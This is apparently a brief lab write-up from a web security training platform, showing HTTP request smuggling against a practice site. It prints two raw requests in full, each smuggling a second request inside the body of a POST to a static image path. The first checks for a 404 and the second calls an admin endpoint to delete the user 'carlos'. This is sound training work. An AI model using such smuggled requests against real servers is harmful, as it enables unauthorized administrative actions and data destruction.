Initially using this request to see if it works:
"
POST /resources/images/blog.svg HTTP/1.1
Host: 0aad007703e46e70816b6b1b00a2003a.web-security-academy.net
Cookie: session=BycQakWbNXjw29Uot82CFvJgROZoiIph
Content-Length: 34
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

GET /hopefully404 HTTP/1.1
foo: x
"

this gives the sequenced get/ method to give the response;
<p>Not Found: /hopefully404</p>

which indicates the exploit works, therefore time to delete some users with the admin panel...


changing the intitial request to this:
"
POST /resources/images/blog.svg HTTP/1.1
Host: 0aad007703e46e70816b6b1b00a2003a.web-security-academy.net
Cookie: session=BycQakWbNXjw29Uot82CFvJgROZoiIph
Content-Length: 42
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

GET /admin/delete?username=carlos HTTP/1.1
foo: x
"

this works and completes the lab.
